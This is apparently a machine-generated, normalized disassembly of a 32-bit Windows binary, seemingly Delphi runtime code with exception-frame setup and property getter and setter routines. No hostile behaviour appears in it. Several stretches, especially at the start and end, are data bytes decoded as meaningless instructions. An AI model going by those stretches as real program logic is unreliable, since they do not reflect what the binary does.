add [ edi + edi * 8 + 0x46640000 ] bl
dec eax
add [ ebp + 0x640000ff ] bl
inc esi
dec eax
add [ esi + 0x640000ff ] bl
inc esi
dec eax
add [ edi + 0x640000ff ] bl
inc esi
dec eax
add [ eax + 0x640000ff ] al
inc esi
dec eax
add [ ecx + 0x640000ff ] al
inc esi
dec eax
add [ edx + 0x640000ff ] al
inc esi
dec eax
add [ ebx + 0x640000ff ] al
inc esi
dec eax
add [ edi + edi * 8 + 0x46640000 ] al
dec eax
add [ ebp + 0x640000ff ] al
inc esi
dec eax
add [ esi + 0x640000ff ] al
inc esi
dec eax
add [ edi + 0x640000ff ] al
inc esi
dec eax
add [ eax + 0x640000ff ] cl
inc esi
dec eax
add [ ecx + 0x640000ff ] cl
inc esi
dec eax
add [ edx + 0x640000ff ] cl
inc esi
dec eax
add [ ebx + 0x640000ff ] cl
inc esi
dec eax
add [ edi + edi * 8 + 0x46640000 ] cl
dec eax
add [ ebp + 0x550000ff ] cl
mov ebp esp
xor eax eax
push ebp
push sub_414a8d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414a94
retn
sub_414ad8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_414b96
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ esi ] 0x1
jne r-xdata
mov eax esi
call sub_414acc
mov eax [ eax + 0x9 ]
mov eax [ eax ]
call sub_414acc
cmp esi [ r-xdata ]
je r-xdata
mov edx edi
mov eax ebx
call sub_408350
jmp r-xdata
mov eax edi
test ebx ebx
setne dl
and edx 0x7f
mov edx [ edx * 4 + rw-data ]
call sub_4041b8
mov eax [ rw-data ]
mov eax [ eax ]
mov edx r-xdata
call sub_408184
test al al
je r-xdata
cmp [ eax + 0x1 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414b9d
lea eax [ ebp - 0x4 ]
call sub_404164
retn
lea edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_4080a4
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_4041b8
jmp r-xdata
lea esi [ eax + 0xd ]
test ebx ebx
je r-xdata
mov eax edi
mov edx esi
call sub_4043c8
xor eax eax
mov al [ esi ]
inc eax
add esi eax
dec ebx
test ebx ebx
jne r-xdata
sub_414bb0
push ebx
push esi
push edi
test edx edx
je r-xdata
or eax 0xffffffff
xor ecx ecx
mov cl [ eax + 0x1 ]
mov eax [ eax + ecx + 0xb ]
mov eax [ eax ]
mov cl [ eax + 0x1 ]
lea esi [ eax + ecx + 0xf ]
mov edi [ eax + ecx + 0x7 ]
xor eax eax
inc eax
lea esi [ ecx + esi + 0x1 ]
cmp eax edi
jle r-xdata
mov bl [ ecx + edx - 0x1 ]
xor bl [ ecx + esi ]
test bl 0xdf
jne r-xdata
mov cl [ esi ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
mov cl [ esi ]
dec ecx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_414bfc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x1
jne r-xdata
mov eax ebx
call sub_414acc
cmp [ eax + 0x1 ] 0x0
jge r-xdata
mov eax esi
call sub_40848c
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_414bb0
mov edx [ rw-data ]
mov eax esi
call sub_408184
test al al
je r-xdata
mov edx [ rw-data ]
mov eax esi
call sub_408184
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
call sub_40848c
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebx
retn
sub_414c60
push ebx
push esi
push edi
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx edx
or edx edx
je r-xdata
xor ebx ebx
mov bl [ eax + 0x1 ]
lea esi [ eax + ebx + 0x2 ]
mov bl [ esi + 0xa ]
movzx edi [ esi + ebx + 0xb ]
test edi edi
je r-xdata
mov cl [ edx - 0x4 ]
mov ch [ edx ]
and ecx 0xdfff
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea eax [ esi + ebx + 0xd ]
mov eax [ eax ]
jmp r-xdata
mov bh 0x0
mov bh 0x0
dec edi
lea eax [ eax + ebx + 0x1b ]
jne r-xdata
mov ch [ edx ]
and ch 0xdf
mov bl [ eax + 0x1a ]
jmp r-xdata
dec ebx
jne r-xdata
mov bx [ eax + 0x1a ]
and bh 0xdf
cmp ebx ecx
je r-xdata
mov ch [ ebx + edx - 0x1 ]
xor ch [ eax + ebx + 0x1a ]
test ch 0xdf
jne r-xdata
sub_414cd0
push ebx
push esi
push edi
xor ecx ecx
mov esi eax
mov cl [ eax + 0x1 ]
mov edi edx
xor eax eax
movzx ecx [ esi + ecx + 0xa ]
[ edi ]
mov esi [ esi + 0x4 ]
xor ecx ecx
test esi esi
je r-xdata
lea edi [ esi + ecx + 0xd ]
pop edi
pop esi
pop ebx
retn
mov esi [ esi ]
jmp r-xdata
lea edi [ edi + ecx + 0x1b ]
dec eax
jne r-xdata
mov [ edx + ebx * 4 ] edi
mov cl [ esi + 0x1 ]
lea esi [ esi + ecx + 0x2 ]
mov cl [ esi + 0xa ]
movzx eax [ esi + ecx + 0xb ]
test eax eax
je r-xdata
movzx ebx [ edi + 0x18 ]
mov cl [ edi + 0x1a ]
cmp [ edx + ebx * 4 ] 0x0
jne r-xdata
sub_414d24
mov ecx [ edx + 0xc ]
test ecx 0xffffff00
je r-xdata
mov al cl
retn
cmp [ edx + 0xf ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
call ecx
retn
ja r-xdata
and ecx 0xffffff
mov cl [ ecx + eax ]
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
retn
sub_414d54
push ebx
push edi
mov edi [ edx ]
mov edi [ edi ]
mov bl 0x4
cmp [ edi ] 0x7
je r-xdata
mov ecx [ edx + 0x4 ]
cmp [ edx + 0x7 ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
mov bl [ edi + ecx + 0x2 ]
call ecx
jmp r-xdata
ja r-xdata
cmp bl 0x4
jae r-xdata
and ecx 0xffffff
add ecx eax
mov al [ ecx ]
cmp bl 0x2
jb r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop edi
pop ebx
retn
cmp bl 0x2
jae r-xdata
mov ax [ ecx ]
cmp bl 0x4
jb r-xdata
movsx eax ax
je r-xdata
cmp bl 0x0
movsx eax al
je r-xdata
mov eax [ ecx ]
and eax 0xffff
and eax 0xff
pop edi
pop ebx
retn
sub_414dc8
push ebx
push esi
push edi
mov edi edx
mov esi [ edi ]
mov esi [ esi ]
mov bl 0x4
cmp [ esi ] 0x7
je r-xdata
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
xor ebx ebx
mov bl [ esi + 0x1 ]
mov bl [ esi + ebx + 0x2 ]
mov esi [ edi + 0x8 ]
cmp [ edi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add eax esi
mov [ eax ] cl
cmp bl 0x2
jb r-xdata
jb r-xdata
pop edi
pop esi
pop ebx
retn
mov [ eax ] cx
cmp bl 0x4
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
mov [ eax ] ecx
sub_414e24
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add esi eax
mov edi ecx
xor ecx ecx
mov cl [ esi ]
inc ecx
[ edi ] [ esi ]
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x4
sub_414e68
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add edi eax
mov eax [ esi ]
mov eax [ eax ]
mov esi ecx
xor ecx ecx
mov cl [ eax + 0x1 ]
mov cl [ eax + ecx + 0x2 ]
lodsb [ esi ]
cmp al cl
jb r-xdata
jb r-xdata
stosb [ edi ]
mov cl al
[ edi ] [ esi ]
pop edi
pop esi
retn
mov al cl
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_414ee4
push ebx
push esi
push edi
add esp 0xffffff00
mov edi ecx
mov esi edx
mov ebx eax
mov eax esp
mov edx edi
mov ecx 0xff
call sub_404400
mov ecx esp
mov edx esi
mov eax ebx
call sub_414e68
add esp 0x100
pop edi
pop esi
pop ebx
retn
sub_414f2c
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
mov edx [ esi + eax ]
mov eax ecx
call sub_414f18
pop edi
pop esi
retn
jb r-xdata
call esi
pop edi
pop esi
retn
movsx esi si
add esi [ eax ]
call [ esi ]
pop edi
pop esi
retn
sub_414f6c
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_414f18
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_414fac
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push j_sub_403ae4
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_4150c8
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_4043ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414ffb
lea eax [ ebp - 0x4 ]
call sub_404844
retn
sub_415004
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41504c
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_404990
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_4151b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415053
lea eax [ ebp - 0x4 ]
call sub_404844
retn
sub_41505c
push ebx
mov ebx ecx
mov ecx [ edx ]
mov ecx [ ecx ]
mov cl [ ecx ]
sub cl 0x5
je r-xdata
mov ecx ebx
call sub_414ebc
pop ebx
retn
sub cl 0x5
je r-xdata
mov ecx ebx
call sub_414f2c
pop ebx
retn
dec cl
je r-xdata
mov ecx ebx
call sub_414fac
pop ebx
retn
jmp r-xdata
mov eax ebx
call sub_404164
pop ebx
retn
sub_41509c
push ebx
mov ebx [ edx ]
mov ebx [ ebx ]
mov bl [ ebx ]
sub bl 0x5
je r-xdata
call sub_414ee4
pop ebx
retn
sub bl 0x5
je r-xdata
call sub_414f6c
pop ebx
retn
dec bl
je r-xdata
call sub_415004
jmp r-xdata
pop ebx
retn
sub_4150c8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4151a0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x5
je r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_41505c
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_404990
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4151a7
lea eax [ ebp - 0x10 ]
call sub_404164
retn
dec al
je r-xdata
mov eax [ ebx + 0x4 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax [ ebp - 0x4 ]
mov edx [ ebx ]
call sub_404880
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_404844
mov [ ebp - 0xc ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ ebp - 0x8 ]
call [ ebp - 0xc ]
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call [ ebp - 0xc ]
jmp r-xdata
mov [ ebp - 0x8 ] esi
mov esi [ ebx + 0x10 ]
cmp esi 0x80000000
jne r-xdata
sub_4151b0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_415276
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x5
je r-xdata
lea eax [ ebp - 0xc ]
mov edx edi
call sub_4043ec
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_41509c
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41527d
lea eax [ ebp - 0xc ]
call sub_404164
retn
dec al
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax ebx
mov edx edi
call sub_404880
jmp r-xdata
mov [ ebp - 0x8 ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx edi
mov edx eax
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_415284
push ebx
push esi
add esp 0xffffffec
mov ebx edx
mov edx [ ebx + 0x4 ]
mov ecx edx
and ecx 0xff000000
cmp ecx 0xff000000
jne r-xdata
cmp ecx 0xfe000000
jne r-xdata
mov esi edx
and esi 0xffffff
add esi eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_414acc
movzx eax [ eax ]
cmp eax 0x4
ja r-xdata
mov [ esp + 0xc ] edx
mov ecx [ eax ]
movsx edx dx
add ecx edx
mov edx [ ecx ]
mov [ esp + 0xc ] edx
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] ax
jmp r-xdata
jmp [ eax * 4 + jump_table_4152c4 ]
mov edx eax
mov eax [ esp + 0x10 ]
call [ esp + 0xc ]
fstp [ esp ]
fwait
mov eax [ esp + 0x10 ]
call [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov [ esp + 0x10 ] eax
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
fld [ esp ]
add esp 0x14
pop esi
pop ebx
retn
fld [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ esi ]
mov [ esp ] eax
mov eax [ esi + 0x4 ]
mov [ esp + 0x4 ] eax
mov ax [ esi + 0x8 ]
mov [ esp + 0x8 ] ax
jmp r-xdata
fild [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ esi ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
mov eax [ ebx ]
mov eax [ eax ]
call sub_414acc
cmp [ eax ] 0x4
jne r-xdata
sub_41539c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx [ esi + 0x8 ]
mov eax [ esi ]
mov eax [ eax ]
call sub_414acc
mov al [ eax ]
mov edx ebx
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
cmp edx 0xfe000000
jne r-xdata
mov edx ebx
and edx 0xffffff
add edx edi
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x8 ] ebx
mov edx [ edi ]
movsx ecx bx
add edx ecx
mov edx [ edx ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
jmp [ eax * 4 + jump_table_4153e4 ]
and eax 0x7f
cmp eax 0x4
ja r-xdata
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x4 ] edi
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov ax [ ebp + 0x10 ]
mov [ edx + 0x8 ] ax
jmp r-xdata
fld [ ebp + 0x8 ]
fistp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
fistp [ edx ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_415513 ]
jmp [ eax * 4 + jump_table_415480 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
sub_4155a8
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
lea edx [ esi + eax ]
mov eax ecx
call sub_415594
pop edi
pop esi
retn
jb r-xdata
call esi
pop edi
pop esi
retn
movsx esi si
add esi [ eax ]
call [ esi ]
pop edi
pop esi
retn
sub_4155e8
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_415594
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_415628
push ebx
push esi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov ebx [ esi + 0x4 ]
cmp [ esi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and ebx 0xffffff
add eax ebx
mov edx [ eax ]
mov ebx [ eax + 0x4 ]
mov [ ecx ] edx
mov [ ecx + 0x4 ] ebx
pop esi
pop ebx
retn
jb r-xdata
call ebx
pop esi
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop esi
pop ebx
retn
sub_415668
push ebx
mov ebx [ edx + 0x8 ]
cmp [ edx + 0xb ] 0xfe
ja r-xdata
and ebx 0xffffff
add eax ebx
mov edx [ ecx ]
mov ebx [ ecx + 0x4 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
pop ebx
retn
mov edx [ edx + 0x10 ]
push [ ecx + 0x4 ]
push [ ecx ]
jb r-xdata
call ebx
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop ebx
retn
sub_4156a0
cmp [ edx + 0x7 ] 0xfe
mov ecx [ edx + 0x4 ]
mov edx [ edx + 0x10 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ eax + 0x4 ]
mov eax [ eax ]
retn
jb r-xdata
call ecx
retn
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
retn
sub_4156c8
push ebp
mov ebp esp
cmp [ edx + 0xb ] 0xfe
mov ecx [ edx + 0x8 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
mov edx [ edx + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jb r-xdata
call ecx
jmp r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop ebp
retn 0x8
sub_415704
push ebx
push esi
add esp 0xfffffff4
mov [ esp ] ecx
mov ebx edx
mov edx [ ebx + 0x4 ]
mov ecx edx
and ecx 0xff000000
cmp ecx 0xff000000
jne r-xdata
cmp ecx 0xfe000000
jne r-xdata
mov ebx edx
and ebx 0xffffff
add ebx eax
mov eax [ esp ]
mov edx [ ebx ]
call sub_405b1c
jmp r-xdata
mov [ esp + 0x4 ] edx
mov ecx [ eax ]
movsx edx dx
add ecx edx
mov edx [ ecx ]
mov [ esp + 0x4 ] edx
jmp r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx esi
mov eax [ esp + 0x8 ]
call [ esp + 0x4 ]
mov edx [ esp ]
mov eax [ esp + 0x8 ]
call [ esp + 0x4 ]
jmp r-xdata
mov [ esp + 0x8 ] eax
mov esi [ ebx + 0x10 ]
cmp esi 0x80000000
jne r-xdata
sub_415784
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ecx [ edx + 0x8 ]
mov ebx ecx
and ebx 0xff000000
cmp ebx 0xff000000
jne r-xdata
cmp ebx 0xfe000000
jne r-xdata
mov ebx ecx
and ebx 0xffffff
add ebx eax
mov eax ebx
mov edx esi
call sub_405b1c
jmp r-xdata
mov [ esp ] ecx
mov ebx [ eax ]
movsx ecx cx
add ebx ecx
mov ecx [ ebx ]
mov [ esp ] ecx
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov ecx esi
mov edx eax
mov eax [ esp + 0x4 ]
call [ esp ]
mov edx esi
mov eax [ esp + 0x4 ]
call [ esp ]
jmp r-xdata
mov [ esp + 0x4 ] eax
mov eax [ edx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_4157f8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41583e
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415845
retn
mov eax rw-data
call sub_404164
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404c00
sub_415850
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_415875
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41587c
retn
sub_415a74
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0xc00415a
add [ eax ] al
add ah cl
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
pop ebx
inc ecx
add [ eax + eax ] cl
add [ eax ] al
jo r-xdata
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
or al 0x0
inc ecx
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ eax ] dl
inc ebp
inc esi
imul ebp [ ebp + 0x53 ] 0x61657274
insd
inc ebp
jb r-xdata
add [ eax ] al
int3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x5b ] bh
inc ecx
add [ eax + eax ] cl
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
pop ebx
inc ecx
add [ eax + eax ] cl
add [ eax ] al
int3
outsd
jb r-xdata
add [ eax ] ecx
push es
push ebx
outsb
jb r-xdata
inc eax
add [ eax ] bl
pop ebx
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x33 ] bl
inc eax
add [ eax * 2 + 0x65727453 ] cl
popad
insd
inc ebp
jb r-xdata
inc eax
add [ eax + 0x5b ] bh
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edx ] al
inc eax
add [ ebp + 0x5abc0040 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebx * 2 + 0xc0041 ] bh
add [ eax ] al
int3
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x4 ] si
adc [ eax ] eax
lea eax [ eax ]
mov esp 0x415a
sub_415be4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x5c
cwde
xor eax 0x35a40040
inc eax
add [ eax - 0x53ffbfcb ] ch
xor eax 0x35a00040
inc ecx
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx * 2 + 0xc0041 ] dh
add [ eax ] al
loopne r-xdata
outsd
jb r-xdata
xor eax 0x35ac0040
inc eax
add [ eax + 0x4035 ] ah
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ ebx ] cl
inc ebp
inc esi
dec edi
jo r-xdata
pop esp
inc ecx
add [ eax ] al
add [ eax ] al
jae r-xdata
inc ecx
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ ebx ] cl
inc ebp
inc esi
imul ebp [ ebp + 0x72 ] 0x6f727245
jb r-xdata
add [ ebx ] dh
inc eax
add [ ebx + esi ] bl
fcomp [ ecx + eax * 2 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fcomp [ ecx + eax * 2 ]
or al 0x0
add [ eax ] al
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
